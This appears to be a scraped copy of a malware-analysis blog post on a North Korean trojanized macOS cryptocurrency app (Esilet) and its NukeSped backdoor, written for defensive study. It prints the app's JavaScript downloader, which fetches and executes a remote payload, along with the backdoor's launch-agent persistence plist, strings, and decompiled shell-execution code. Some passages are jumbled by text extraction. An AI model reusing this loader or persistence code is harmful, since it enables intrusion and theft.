objective-see.org /blog/blog_0x6E.htmlFrom The DPRK With Love - analyzing a recent north korean macOS backdoorby: Patrick Wardle / May 9, 2022BackgroundIn mid April, the Cybersecurity & Infrastructure Security Agency (CISA) published a report detailing "[A] North Korean State-Sponsored APT Target[ing] Blockchain Companies":The report begins with an informative overview of both the targets of, and techniques used the North Korean cyber actor (publicly known as Lazarus Group or APT38).The U.S. government has observed North Korean cyber actors targeting a variety of organizations in the blockchain technology and cryptocurrency industry The activity described in this advisory involves social engineering of victims using a variety of communication platforms to encourage individuals to download trojanized cryptocurrency applications on Windows or macOS operating systems. The cyber actors then use the applications to gain access to the victim‚Äôs computer, propagate malware across the victim‚Äôs network environment, and steal private keys or exploit other security gaps.These activities enable additional follow-on activities that initiate fraudulent blockchain transactions. -CISAMoreover, the report also (albeit rather briefly) describes the malicious applications targeting both Windows and Mac.The macOS samples listed in the CISA report, include:DAFOM-1.0.0.dmg TokenAIS.app.zip Specifically we‚Äôll focus on a sample distributed within a trojanized application named Esilet.Esilet: 1st-Stage The propensity of the North Koreans to target the cryptocurrency community via trojanized application is not new. Previous research on this includes:The CISA report notes that "Esilet claims to offer live cryptocurrency prices and price predictions".Objective-See: OSX.WatchCat SentinelOne: Four Distinct Families of Lazarus Malware Target Apple‚Äôs macOS Platform ‚Ä¶which can be confirmed by running the (trojanized) application in a isolated Virtual Machine:The application is distributed via a disk image, named Esilet.dmg: % du -h ~/Malware/NukeSped/Esilet.dmg 78M /Users/patrick/Malware/NukeSped/Esilet.dmg% shasum -a256 ~/Malware/NukeSped/Esilet.dmg detections have (somewhat) increased since then:Esilet.dmg on VirusTotalYou can mount the disk image (via hdiutil), to extract its files: hdiutil attach /Users/patrick/Malware/TraderTraitor/Esilet.dmg -noverify/dev/disk6 GUID_partition_scheme /dev/disk6s1 Apple_HFS /Volumes/Esilet% ls /Volumes/Esilet Esilet.appOpening the mounted disk image (/Volumes/Esilet) in Finder reveals a application, named Esilet.app:3/18The application is not signed, and via the file utility we see its main executable is a standard 64-bit Mach-O binary (named Esilet): % codesign -dvv /Volumes/Esilet/Esilet.app /Volumes/Esilet/Esilet.app: code object is not signed at all% file /Volumes/Esilet/Esilet.app/Contents/MacOS/Esilet /Volumes/Esilet/Esilet.app/Contents/MacOS/Esilet: Mach-O 64-bit executable x86_644/18We can confirm CISA‚Äôs findings that application is an Electon application, by looking at Esilet.app‚Äôs dependencies via otool (noting Electron Framework.framework): % otool -L /Volumes/Esilet/Esilet.app/Contents/MacOS/Esilet /Volumes/Esilet/Esilet.app/Contents/MacOS/Esilet:/System/Library/Frameworks/MediaPlayer.framework/Versions/A/MediaPlayer @rpath/Electron Framework.framework/Electron Framework From a reversing point of view, this is good news. Why? Electron applications are rather trivial to analyze, Electon is, ‚Äúa framework for creating native applications with web technologies like JavaScript, HTML, as they (always?) ship with their original (JavaScript) source code. However this code may be archived and CSS.‚Äù and thus, must first be unpacked. To learn more about Electon, head over to: If an Electron application is packed, the archive format is asar. From the asar github repo:"Asar is a simple extensive archive format, it works like tar that concatenates all files together without compression, while having random access support."ElectronJS.org.As noted in a StackOver post titled, ‚ÄúHow to unpack an .asar file?‚Äù one can unpack an asar archive via the following: npx asar extract app.asar destfolder.In the Esilet.app we find an asar archive (app.asar) in Contents/Resources/ and extract it in the following manner: $ npx asar extract Esilet.app/Contents/Resources/app.asar asar(unpacked)The extracted archive contains various files, most notably several JavaScript files:5/18The CISA report notes:"It contains a simpler version of TraderTraitor code in a function exported as UpdateCheckSync() located in a file named update.js, which is bundled in renderer.prod.js, which is in the app.asar archive." -CISALet‚Äôs take a peek at the (beautified) renderer.prod.js files, specifically looking at the UpdateCheckSync function:1"./app/update.js": function(e, t, r) { 2 async function i() { 3 var e = "/"; 4 "win32" == r("os").platform().toLowerCase() && (e = "\\"); 5 var t = r("os").tmpdir(), 6 i = "url" + r("os").platform() + ".json", 7 n = t + e + "Esilet-tmp" + Math.random().toString(36).substring(8); 8 "\\" == e && (n += ".exe"); 9 var o = t + e + "noEsilet-0000"; 10 try { 11 if (r("fs").existsSync(o)) return; 12 request = r("./app/node_modules/request/index.js"), request({ 13 rejectUnauthorized: !1, 14 url: i 15 }, (function(t, i, o) {6/1816 if (t || !i || 200 != i.statusCode) return; 17 var a = "url" + JSON.parse(o).path; 18 let s = r("fs").createWriteStream(n); 19 request({ 20 rejectUnauthorized: !1, 21 url: a, 22 gzip: !0 23 }).pipe(s).on("finish", () => { 24 "\\" != e && r("fs").chmodSync(n, 511), r("child_process").exec(n), setTimeout((function() { 25 console.log(n), r("child_process").exec(n), console.log(n) 26 }), 12e3) 27 }).on("error", e => {}) 28 })) 29 } catch (e) {} 30 } 31 e.exports = { 32 UpdateCheckSync: i, 33 UpdateCheckAsync: async function() { 34 await new Promise(e => { 39 },This code will be automatically executed when the user opens the trojanized application.The most relevant logic of the UpdateCheckSync function can be found around line 17. Here you can see the code builds a url (base url: url and then makes a request which is written out (to a path found in the n variable).On line 24, this downloaded file is executed, via exec(n).And what is downloaded (and executed)? The CISA report states:[the application] has been observed delivering payloads of at least two different macOS variants of Manuscrypt" -CISALet‚Äôs now take a look at the Manuscrypt (Nukesped) backdoor.Esilet: 2nd-StageAs the CISA report provides several hashes for what they refer to as the ‚ÄúManuscrypt‚Äù backdoor. (We‚Äôll stick with ‚ÄúNukeSped‚Äù, which seems to be the name that public AV-engines prefer).7/18The binary we‚Äôll focus on is named Esilet-tmpg7lpp. It is an unsigned 64-bit Mach-O binary: % shasum -a256 ~/Malware/NukeSped/Esilet-tmpg7lpp Esilet-tmpg7lpp: Mach-O 64-bit executable x86_64% codesign -dvv Esilet-tmpg7lpp Esilet-tmpg7lpp: code object is not signed at allThe binary was originally submitted to VirusTotal in late 2020 (via one of Objective-See‚Äôs tools, which allows users to submit files directly to VirusTotal). Although it was originally undetected, detections have (somewhat) increased since then:Esilet-tmpg7lpp on VirusTotalWhen triaging an unknown (possibly) malicious binary, running strings (to extract, well, strings) can reveal a myriad of information: % strings - Esilet-tmpg7lppMozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/537.13+ (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2 Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/534.55.3 (KHTML, like Gecko) Version/5.1.3 Safari/534.53.10 Cookie: _ga=%s%02d%d%d%02d%s; gid=%s%02d%d%03d%s8/18Content-Type: application/octet-stream Content-Length: %d User-Agent: %s Cache-Control: no-cache Pragma: no-cache Connection: keep-alive <?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "url"> <plist version="1.0"> <dict> <key>Label</key> <string>com.%s.agent</string> <key>ProgramArguments</key> <array> <string>%s</string> <string>daemon</string> </array> <key>KeepAlive</key> <false/> <key>RunAtLoad</key> /Library/LaunchDaemons/com.%s.agent.plist %s/Library/LaunchAgents/com.%s.agent.plist ProductVersion: %d.%d.%d networksetup -getwebproxy '%s' applex.services.agent9/18 url url url @_writeSolely from the strings output we can glean various information (that sure, should be be fully confirmed via continued analysis):User-agent strings used by the binary HTTP headers used by the binary, including (custom?) cookie values An embedded launch item property list Path for the launch item property list Shell commands likely for generating a survey URLs, likely command and control (or exfil) servers curl-related APIs for networking communications API related to executing commands, reading/writing files, etc. etc.10/18In short, it appears the the Esilet-tmpg7lpp is a persistent backdoor, that affords remote attackers continued access and capabilities on an infected system.Ok, enough static analysis, let‚Äôs run Esilet-tmpg7lpp (in an isolated VM) and see what it does! The Lazarus Group are rather fond of using the libcurl APIs to provide networking capabilities for their Unsurprisingly, at least at the UI level, nothing appears amiss: implants/backdoors (e.g. OSX.WatchCat).‚Ä¶behind the scenes though, is another storyVial a File Monitor we can passively observe the malware persisting itself as a launch item (agent): # FileMonitor.app/Contents/MacOS/FileMonitor "timestamp": "2022-05-08 07:44:28 +0000", "/Users/user/Library/LaunchAgents/com.applex.services.agent.agent.plist", "path": "/Users/user/Desktop/Esilet-tmpg7lpp", "uid": 501, "arguments": ["/Users/user/Desktop/Esilet-tmpg7lpp"], "ppid": 1380, "ancestors": [1380, 1379, 1377, 1], "signing info (reported)": { "csFlags": 0,11/18"platformBinary": 0, "signing info (computed)": { "timestamp": "2022-05-08 07:44:28 +0000", "/Users/user/Library/LaunchAgents/com.applex.services.agent.agent.plist", "path": "/Users/user/Desktop/Esilet-tmpg7lpp", "uid": 501, "arguments": ["/Users/user/Desktop/Esilet-tmpg7lpp"], "ppid": 1380, "ancestors": [1380, 1379, 1377, 1], "signing info (reported)": { "signing info (computed)": { }We can examine the malware‚Äôs (now-created) launch agent property list (~/Library/LaunchAgents/com.applex.services.agent.agent.plist)1<?xml version="1.0" encoding="UTF-8"?> 2<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" >12/183<plist version="1.0"> 4<dict> 5 <key>Label</key> 6 <string>com.applex.services.agent.agent</string> 7 <key>ProgramArguments</key> 8 <array> 9 <string>/Users/user/Desktop/Esilet-tmpg7lpp</string> 10 <string>daemon</string> 11 </array> 12 <key>KeepAlive</key> 13 <false/> 14 <key>RunAtLoad</key> 17</plist>Its a pretty standard persistent launch agent with:Name (Label): com.applex.services.agent.agent Path: Location where the malware was executed (e.g. ~/Desktop/Esilet-tmpg7lpp) RunAtLoad: Set to true ensuring the malware will be automatically (re)started each time the user logs in.Next, the malware attempts to beacon out to (one of) its command and control server for tasking. For example, it was observed attempting to connect to www.vinoymas.ch (which resolved to: capabilities.For example at 0x0000000100004A50 we find a function that after connecting to the server, contains a large switch statement that appears invoke various functions, based on commands received from the the server.__text:0000000100004B52 mov ecx, eax __text:0000000100004B54 sub ecx, 21279Eh __text:0000000100004B5A mov [rbp+task?], eax __text:0000000100004B5D jz loc_100004C80 __text:0000000100004B63 jmp $+5 __text:0000000100004B68 loc_100004B68: __text:0000000100004B68 mov eax, [rbp+task?] __text:0000000100004B6B sub eax, 2AFCB2h13/18__text:0000000100004B70 jz loc_100004C13 __text:0000000100004B76 jmp $+5 __text:0000000100004B7B loc_100004B7B: __text:0000000100004B7B mov eax, [rbp+task?] __text:0000000100004B7E sub eax, 38CE55h __text:0000000100004B83 jz loc_100004C3A __text:0000000100004B89 jmp $+5 __text:0000000100004B8E loc_100004B8E: __text:0000000100004B8E mov eax, [rbp+task?] __text:0000000100004B91 sub eax, 3A65F8h __text:0000000100004B96 jz loc_100004D3F __text:0000000100004B9C jmp $+5 __text:0000000100004BA1 loc_100004BA1: __text:0000000100004BA1 mov eax, [rbp+task?] __text:0000000100004BA4 sub eax, 3A6A93h __text:0000000100004BA9 jz loc_100004C5D __text:0000000100004BAF jmp $+5For example, if the instruction at line 0x0000000100004B6B (sub eax, 2AFCB2h, which operates on the tasking command from the server), results in a zero (e.g. a match), the jz (jump if zero flag is set) will be taken:__text:0000000100004B68 mov eax, [rbp+task?] __text:0000000100004B6B sub eax, 2AFCB2h __text:0000000100004B70 jz loc_100004C13The jump destination is loc_100004C13 which shortly thereafter calls a subroutine found at 0x0000000100002920This subroutine calls various other subroutines to generate an survey of the infected system. For example a subroutine at 0x0000000100004060 executes the sw_vers shell command to determine the (product and build) version of system:1var_2D0 = popen("sw_vers", "r"); 2if (var_2D0 != 0x0) { 3 rax = fgets(&var_210, 0x200, var_2D0); 4 if (rax != 0x0) {14/185 rax = fgets(&var_210, 0x200, var_2D0); 6 if (rax != 0x0) { 7 sub_100003d30(&var_210); 8 rax = sscanf(&var_210, "ProductVersion: %d.%d.%d"); 9 var_2B4 = rax; 10 if (var_2B4 == 0x3) { 11 *(int32_t *)var_298 = 0x0; 12 *(int32_t *)var_2A0 = 0x0; 13 rax = fgets(&var_210, 0x200, var_2D0); 14 if (rax != 0x0) { 15 sub_100003d30(&var_210); 16 rax = sscanf(&var_210, "BuildVersion: %x"); 17 var_2B4 = rax; 18 if (var_2B4 == 0x1) { 19 *(int32_t *)var_2A8 = 0x0; 20 var_2B4 = 0x1; 26}‚Ä¶thus we know the backdoor can be remotely tasked to generate a survey of an infected system.Another taskable subroutine is found at 0x00000001000036A0. It contains code to execute a shellcommand (or script) via /bin/bash -c:1;sub_1000036a0 4 var_74 = fork(); 5 if (var_74 >= 0x0) goto loc_100003755; 6 goto loc_100003bb0; 9 if (0x0 == var_74) { 10 close(var_10); 11 if (dup2(var_C, 0x1) < 0x0) { 12 exit(*(int32_t *)error()); 13 } 14 if (dup2(var_C, 0x2) < 0x0) { 15 exit(*(int32_t *)error());15/1816 } 17 var_30 = "/bin/bash"; 18 rax = execv(var_30, &var_30); 19 if (rax < 0x0) { 20 exit(*(int32_t *)error()); 21 } 22 exit(0x0); 23 }This affords remote attacker the ability to execute arbitrary commands on an infected system.Other taskable commands are what one would expect in a persistent backdoor (e.g. file read (and exfil), file write, etc. etc.).Esilet vs. Objective-See‚Äôs ToolsWhenever new malware is uncovered, part of that analysis is to see how it stacks up against Objective- See‚Äôs free, open-source macOS security tools.‚Ä¶and if our tools don‚Äôt fully detect or mitigate the malware, we then know how they can be improved!First off, let‚Äôs talk about KnockKnock which enumerates persistently installed software to detect any persistent malware. Good news, when run, KnockKnock easily uncovers and flags the malware‚Äôs launch agent:KnockKnock who's there?The metadata from the submission to VirusTotal reveals that the Esilet-tmpg7lpp binary, was initially Next, we have BlockBlock which monitors several common persistence locations. Its goal is to, at submitted via one of Objective-See's tools! How cool!? ü§ó runtime, detect any malware that attempts to persist. And again, good news, BlockBlock detect the16/18malware when it attempts to persist as a launch agent When the tools detect something suspicious, the user can submitted the item to VirusTotal for analysis. (~/Library/LaunchAgents/com.applex.services.agent.agent.plist):BlockBlock block, blocking!Finally, we have LuLu our firewall, that can alert you about unauthorized network connections. And yes, it will alert you when the malware attempts to connect to its command and control server for tasking:LuLu, unauthorized network alertConclusion17/18A recent CISA report provided a comprehensive overview of recent North Korean (Lazarus Group) hacking techniques and tools.In this blog post, we dove deeper into the macOS malware used in these attacks, further detailing the malware‚Äôs 1st and 2nd stage components, including persistence and capabilities.Finally we showed how Objective-See‚Äôs heuristic-based tools easy thwarted this malware, even with no a priori knowledge!18/18 